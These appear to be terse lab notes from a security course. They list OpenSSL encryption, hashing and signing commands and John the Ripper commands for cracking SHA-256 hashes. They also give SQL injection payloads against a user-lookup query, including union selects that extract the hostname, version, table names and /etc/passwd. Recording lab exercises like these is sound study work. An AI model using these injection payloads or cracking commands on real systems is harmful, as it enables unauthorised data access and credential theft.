NOTES:

SSL:
cd {res path]openssl1-1.1\*64\bin
Encryption : openssl aes-128-cbc -e -in me.txt -out cipher.bin -k "password" -nosalt
Decrypion : openssl aes-128-cbc -d -in cipher.bin -out pt.txt -k "password" –nosalt
Avalanche : openssl aes-128-cbc -e -in ptchanged.txt -out cipher1.bin -k "password" -nosalt
Pvt key : openssl genrsa –out pvtkey.pem
Pub key : openssl rsa -pubout -in pvtkey.pem -out pubkey.pem
Pvt key in hex : openssl rsa -text -in pvtkey.pem
Enc using RSA pub key : openssl rsautl -encrypt -in plain.txt -pubin -inkey pubkey.pem -out c1.bin
Dec using RSA pvt key : openssl rsautl -decrypt -in c1.bin -inkey pvtkey.pem -out dec1.txt
Hash using MD5 : openssl md5 plain.txt
Hash using sha256 : openssl SHA256 plain.txt
Signature using SHA AND RSA : openssl dgst -sha1 -sign pvtkey.pem -out s.bin plain.txt
Verify the Signature : openssl dgst -sha1 -verify pubkey.pem -signature s.bin plain.txt


PASSWORD EXTRACTION: - copy till run
C:\john-1.9.0 -jumbo-1-win64\run>john
> john --list=formats
> john --format=raw-sha256 lab6IS.txt
[+code]

SQL INJECTION:
SELECT first_name, last_name FROM users WHERE user_id = '   1   '
SELECT first_name, last_name FROM users WHERE user_id = ‘  1' or '1'='1  ’
SELECT first_name, last_name FROM users WHERE user_id = 'a' ORDER BY 1;#'
SELECT first_name, last_name FROM users WHERE user_id = ' ' union select
 null,@@hostname#'
SELECT first_name, last_name FROM users WHERE user_id = ' ' union select
 load_file('/etc/passwd'),null#'
1 or 1=1 union select null, table_name from information_schema.tables#
1 union select null,@@version#
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";


WIRESHARK:
FIREWALL : ---- Server , hub, 3 pc --ping 20.0.0.1
VPN :
